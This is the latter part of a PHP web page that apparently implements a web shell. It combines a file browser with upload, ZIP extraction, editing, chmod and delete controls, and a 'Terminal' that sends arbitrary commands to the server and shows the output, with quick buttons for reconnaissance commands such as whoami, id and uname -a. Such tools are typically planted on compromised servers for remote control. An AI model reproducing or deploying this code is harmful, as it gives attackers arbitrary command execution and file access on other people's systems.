        <table class="file-table">
            <thead>
                <tr>
                    <th>Name</th>
                    <th width="100">Size</th>
                    <th width="100">Permissions</th>
                    <th width="150">Modified</th>
                    <th width="280">Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php if ($currentPath != $rootPath): ?>
                <tr>
                    <td colspan="5">
                        <a href="?path=<?= urlencode(dirname($currentPath)) ?>" class="file-name">
                            <span class="file-icon">📁</span>
                            <span>.. (Parent Directory)</span>
                        </a>
                    </td>
                </tr>
                <?php endif; ?>
                
                <?php
                $files = scandir($currentPath);
                $dirs = [];
                $fileItems = [];
                
                foreach ($files as $file) {
                    if ($file == '.' || $file == '..') continue;
                    $path = $currentPath . '/' . $file;
                    if (is_dir($path)) $dirs[] = $file;
                    else $fileItems[] = $file;
                }
                
                sort($dirs);
                sort($fileItems);
                
                foreach (array_merge($dirs, $fileItems) as $file):
                    $path = $currentPath . '/' . $file;
                    $isDir = is_dir($path);
                    $size = $isDir ? '-' : formatBytes(filesize($path));
                    $perms = substr(sprintf('%o', fileperms($path)), -4);
                    $mtime = date('Y-m-d H:i:s', filemtime($path));
                    $icon = $isDir ? '📁' : getFileIcon($file);
                ?>
                <tr>
                    <td data-search="<?= strtolower($file) ?>">
                        <?php if ($isDir): ?>
                            <a href="?path=<?= urlencode($path) ?>" class="file-name">
                                <span class="file-icon"><?= $icon ?></span>
                                <span><?= htmlspecialchars($file) ?></span>
                            </a>
                        <?php else: ?>
                            <a href="?file_access=<?= urlencode($path) ?>" target="_blank" class="file-name">
                                <span class="file-icon"><?= $icon ?></span>
                                <span><?= htmlspecialchars($file) ?></span>
                                <span class="file-size"> (<?= $size ?>)</span>
                            </a>
                        <?php endif; ?>
                    </td>
                    <td><?= $size ?></td>
                    <td><span class="file-perms"><?= $perms ?></span></td>
                    <td class="file-date"><?= $mtime ?></td>
                    <td class="action-btns">
                        <?php if ($isDir): ?>
                            <a href="?path=<?= urlencode($path) ?>" class="action-btn">📂 Open</a>
                        <?php else: ?>
                            <a href="?file_access=<?= urlencode($path) ?>" target="_blank" class="action-btn">👁️ View</a>
                            <a href="?edit=<?= urlencode($file) ?>&path=<?= urlencode($currentPath) ?>" class="action-btn">✏️ Edit</a>
                        <?php endif; ?>
                        <button class="action-btn" onclick="renameFile('<?= htmlspecialchars(addslashes($file)) ?>')">📝 Rename</button>
                        <button class="action-btn" onclick="chmodFile('<?= htmlspecialchars(addslashes($file)) ?>', '<?= $perms ?>')">🔐 Chmod</button>
                        <a href="?delete=<?= urlencode($file) ?>&path=<?= urlencode($currentPath) ?>" class="action-btn delete-btn" onclick="return confirm('Delete <?= htmlspecialchars($file) ?>?')">🗑️ Delete</a>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>

        <div class="stats">
            <span class="stat-item">📁 Total items: <?= count($dirs) + count($fileItems) ?></span>
            <span class="stat-item">📂 Folders: <?= count($dirs) ?></span>
            <span class="stat-item">📄 Files: <?= count($fileItems) ?></span>
            <span class="stat-item"><?= is_writable($currentPath) ? '✅ Writable' : '❌ Read Only' ?></span>
        </div>

        <div class="terminal">
            <div class="terminal-header">
                <span class="terminal-title">⚡ Terminal</span>
                <span class="terminal-cwd" id="terminalCwd"><?= htmlspecialchars($currentPath) ?></span>
            </div>
            <div class="terminal-output" id="terminalOutput">
                <pre>Ready. Type a command and press Enter or click Run...</pre>
            </div>
            <div class="terminal-input-area">
                <span class="terminal-prompt">$</span>
                <input type="text" class="terminal-input" id="terminalInput" placeholder="Enter command (ls, pwd, whoami, etc)..." autofocus>
                <button class="terminal-send" onclick="runCommand()">Run</button>
                <button class="btn" onclick="clearTerminal()" style="padding: 8px 15px;">Clear</button>
            </div>
            <div class="quick-cmds">
                <span class="quick-cmd" onclick="setCommand('ls -la')">ls -la</span>
                <span class="quick-cmd" onclick="setCommand('pwd')">pwd</span>
                <span class="quick-cmd" onclick="setCommand('whoami')">whoami</span>
                <span class="quick-cmd" onclick="setCommand('php -v')">php -v</span>
                <span class="quick-cmd" onclick="setCommand('wget --help')">wget</span>
                <span class="quick-cmd" onclick="setCommand('curl --help')">curl</span>
                <span class="quick-cmd" onclick="setCommand('id')">id</span>
                <span class="quick-cmd" onclick="setCommand('uname -a')">uname -a</span>
            </div>
        </div>
        <?php endif; ?>
    </div>

    <div class="modal" id="uploadModal">
        <div class="modal-content">
            <div class="modal-title">📤 Upload Files</div>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="upload_file[]" multiple class="modal-input" required>
                <p style="color: #888; font-size: 12px; margin-bottom: 15px;">
                    You can select multiple files
                </p>
                <div class="modal-buttons">
                    <button type="button" class="modal-btn modal-btn-cancel" onclick="hideModal('upload')">Cancel</button>
                    <button type="submit" class="modal-btn modal-btn-submit">Upload</button>
                </div>
            </form>
        </div>
    </div>

    <div class="modal" id="zipModal">
        <div class="modal-content">
            <div class="modal-title">📦 Upload & Extract ZIP</div>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="zip_file" accept=".zip" class="modal-input" required>
                <p style="color: #888; font-size: 12px; margin-bottom: 15px;">
                    ZIP file will be automatically extracted to current directory
                </p>
                <div class="modal-buttons">
                    <button type="button" class="modal-btn modal-btn-cancel" onclick="hideModal('zip')">Cancel</button>
                    <button type="submit" class="modal-btn modal-btn-submit">Upload & Extract</button>
                </div>
            </form>
        </div>
    </div>

    <div class="modal" id="folderModal">
        <div class="modal-content">
            <div class="modal-title">📁 Create New Folder</div>
            <form method="post">
                <input type="text" name="folder_name" class="modal-input" placeholder="Folder name" required>
                <div class="modal-buttons">
                    <button type="button" class="modal-btn modal-btn-cancel" onclick="hideModal('folder')">Cancel</button>
                    <button type="submit" name="create_folder" class="modal-btn modal-btn-submit">Create</button>
                </div>
            </form>
        </div>
    </div>

    <div class="modal" id="fileModal">
        <div class="modal-content">
            <div class="modal-title">📄 Create New File</div>
            <form method="post">
                <input type="text" name="file_name" class="modal-input" placeholder="File name" required>
                <textarea name="content" class="modal-textarea" placeholder="File content... (optional)"></textarea>
                <div class="modal-buttons">
                    <button type="button" class="modal-btn modal-btn-cancel" onclick="hideModal('file')">Cancel</button>
                    <button type="submit" name="create_file" class="modal-btn modal-btn-submit">Create</button>
                </div>
            </form>
        </div>
    </div>

    <div class="modal" id="renameModal">
        <div class="modal-content">
            <div class="modal-title">📝 Rename</div>
            <form method="post">
                <input type="hidden" name="old_name" id="oldName">
                <input type="text" name="new_name" class="modal-input" id="newName" placeholder="New name" required>
                <div class="modal-buttons">
                    <button type="button" class="modal-btn modal-btn-cancel" onclick="hideModal('rename')">Cancel</button>
                    <button type="submit" name="rename" class="modal-btn modal-btn-submit">Rename</button>
                </div>
            </form>
        </div>
    </div>

    <div class="modal" id="chmodModal">
        <div class="modal-content">
            <div class="modal-title">🔐 Change Permissions</div>
            <form method="post">
                <input type="hidden" name="chmod_file" id="chmodFile">
                <input type="text" name="permissions" class="modal-input" id="chmodPerms" placeholder="755" pattern="[0-7]{3,4}" required>
                <p style="color: #888; font-size: 12px; margin-bottom: 15px;">
                    Enter octal permissions (e.g., 755, 644, 777)
                </p>
                <div class="modal-buttons">
                    <button type="button" class="modal-btn modal-btn-cancel" onclick="hideModal('chmod')">Cancel</button>
                    <button type="submit" name="chmod" class="modal-btn modal-btn-submit">Apply</button>
                </div>
            </form>
        </div>
    </div>

    <script>
        let currentCwd = <?= json_encode($currentPath) ?>;
        let searchTimeout;

        function showModal(type) {
            document.getElementById(type + 'Modal').style.display = 'flex';
        }

        function hideModal(type) {
            document.getElementById(type + 'Modal').style.display = 'none';
        }

        function renameFile(oldName) {
            document.getElementById('oldName').value = oldName;
            document.getElementById('newName').value = oldName;
            document.getElementById('renameModal').style.display = 'flex';
        }

        function chmodFile(file, perms) {
            document.getElementById('chmodFile').value = file;
            document.getElementById('chmodPerms').value = perms;
            document.getElementById('chmodModal').style.display = 'flex';
        }

        function runCommand() {
            const input = document.getElementById('terminalInput');
            const cmd = input.value.trim();
            if (!cmd) return;

            const output = document.getElementById('terminalOutput');
            output.innerHTML = '<pre>$ ' + escapeHtml(cmd) + '\nExecuting...</pre>';

            fetch('', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'cmd=' + encodeURIComponent(cmd) + '&cwd=' + encodeURIComponent(currentCwd)
            })
            .then(res => res.json())
            .then(data => {
                if (data.cwd) {
                    currentCwd = data.cwd;
                    document.getElementById('terminalCwd').textContent = currentCwd;
                }
                let outputText = data.output || '(no output)';
                output.innerHTML = '<pre>$ ' + escapeHtml(cmd) + '\n' + escapeHtml(outputText) + '</pre>';
                input.value = '';
                output.scrollTop = output.scrollHeight;
            })
            .catch(err => {
                output.innerHTML = '<pre>Error: ' + escapeHtml(err.message) + '</pre>';
            });
        }

        function setCommand(cmd) {
            document.getElementById('terminalInput').value = cmd;
            runCommand();
        }

        function clearTerminal() {
            document.getElementById('terminalOutput').innerHTML = '<pre>Ready. Type a command and press Enter or click Run...</pre>';
            document.getElementById('terminalInput').value = '';
            document.getElementById('terminalInput').focus();
        }

        function searchFiles(query) {
            clearTimeout(searchTimeout);
            searchTimeout = setTimeout(() => {
                const rows = document.querySelectorAll('.file-table tbody tr');
                let count = 0;
                const searchLower = query.toLowerCase();
                rows.forEach(row => {
                    const searchData = row.querySelector('td:first-child')?.getAttribute('data-search') || 
                                     row.textContent.toLowerCase();
                    if (searchData.includes(searchLower) || query === '') {
                        row.style.display = '';
                        count++;
                    } else {
                        row.style.display = 'none';
                    }
                });
            }, 300);
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                document.querySelectorAll('.modal').forEach(m => m.style.display = 'none');
            }
            if (e.ctrlKey && e.key === 'l') {
                e.preventDefault();
                clearTerminal();
            }
            if (e.ctrlKey && e.key === 'f') {
                e.preventDefault();
                document.getElementById('searchInput').focus();
            }
        });

        document.getElementById('terminalInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                runCommand();
            }
        });

        window.onload = function() {
            document.getElementById('terminalInput').focus();
        }

        setTimeout(() => {
            document.querySelectorAll('.message').forEach(msg => {
                msg.style.opacity = '0';
                msg.style.transition = 'opacity 0.5s';
                setTimeout(() => msg.remove(), 500);
            });
        }, 5000);

        window.onclick = function(e) {
            if (e.target.classList.contains('modal')) {
                e.target.style.display = 'none';
            }
        }
    </script>
</body>
</html>

<?php
function formatBytes($bytes, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, $precision) . ' ' . $units[$pow];
}

function getFileIcon($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = [
        'txt' => '📄', 'php' => '🐘', 'html' => '🌐', 'css' => '🎨',
        'js' => '📜', 'json' => '📊', 'xml' => '📋', 'jpg' => '🖼️',
        'jpeg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️', 'zip' => '📦',
        'tar' => '📦', 'gz' => '📦', 'rar' => '📦', 'pdf' => '📕',
        'doc' => '📘', 'docx' => '📘', 'sql' => '🗄️', 'log' => '📝',
        'sh' => '⚙️', 'py' => '🐍', 'rb' => '💎', 'go' => '🔵'
    ];
    return $icons[$ext] ?? '📄';
}
?>
